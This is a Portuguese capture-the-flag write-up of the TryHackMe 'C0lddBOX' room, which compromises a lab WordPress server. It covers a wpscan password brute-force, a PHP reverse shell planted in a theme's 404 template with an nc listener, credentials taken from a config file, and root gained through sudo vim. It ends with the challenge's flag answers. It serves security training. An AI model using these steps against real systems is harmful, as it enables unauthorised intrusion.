# Relatório da sala [C0lddBOX](https://tryhackme.com/r/room/colddboxeasy)

## IP alvo: 10.10.109.242
```
# Nmap 7.93 scan initiated Tue Aug 20 20:51:43 2024 as: nmap -T4 -sV -sC -o nmap_colddbox.txt 10.10.109.242
Nmap scan report for 10.10.109.242
Host is up (0.23s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Sabendo as portas abertas, realizei uma enumeração de diretórios utilizando a ferramenta gobuster
```
/.html                (Status: 403) [Size: 278]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.109.242/]
/.php                 (Status: 403) [Size: 278]
/wp-content           (Status: 301) [Size: 319] [--> http://10.10.109.242/wp-content/]
/wp-login.php         (Status: 200) [Size: 2547]
/license.txt          (Status: 200) [Size: 19930]
/wp-includes          (Status: 301) [Size: 320] [--> http://10.10.109.242/wp-includes/]
/readme.html          (Status: 200) [Size: 7173]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-admin             (Status: 301) [Size: 317] [--> http://10.10.109.242/wp-admin/]
/hidden               (Status: 301) [Size: 315] [--> http://10.10.109.242/hidden/]
/xmlrpc.php           (Status: 200) [Size: 42]
```
Após descobrir o diretório /hidden, pode-se notar que existem 3 usuários no qual podem ter contas vinculadas no wp
```wpscan --url http://10.10.248.96 -U user.txt -P /usr/share/wordlists/rockyou.txt```Realizando um brute force no wp com esses nomes, se descobriu a senha do usuário
**[SUCCESS] - C0ldd / 9876543210**
Acessando o WP, podemos ir em "Themes" e mudar o "404 template" por um reverse shell em php, após alterar o template, iniciei um ```"nc -lvnp 5555"``` e executei o reverse shell ```http://10.10.109.242/wp-content/themes/twentyfifteen/404.php```, realizando isso, obtive acesso ao shell pela minha máquina

Comando utilizado para deixar o shell melhor visível = **python3 -c 'import pty;pty.spawn("/bin/bash")'**. Ao tentar acessar o diretório **/home/c0ldd/user.txt**, uma mensagem de acesso negado apareceu, sendo necessário procurar uma outra maneira de acessar esse documento

Buscando por maneiras, entrei no diretório **/var/www/html/wp-setting.php** no qual apresentava um usuário:**c0ldd** e senha:**cybersecurity** acessando com o comando su c0ldd e a senha: cybersecurity, feito! estamos execuando como usuário c0ldd agora

**cat /home/c0ldd/user.txt** = 1* flag descoberta

A missão agora era virar root, com isso, dei um **sudo -l** e vi que o diretório **/usr/bin/vim** estava disponível para modificar criando um ```:!/bin/bash``` ele elevou os previlégios e me deixou como root da máquina, **cat /root/root.txt**, VAMO! descoberta a última flag do desafio.

<details>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
<summary>Respostas do desafio</summary>
  
1.  **flag{RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==}**
2.  **flag{wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=}**

</details>
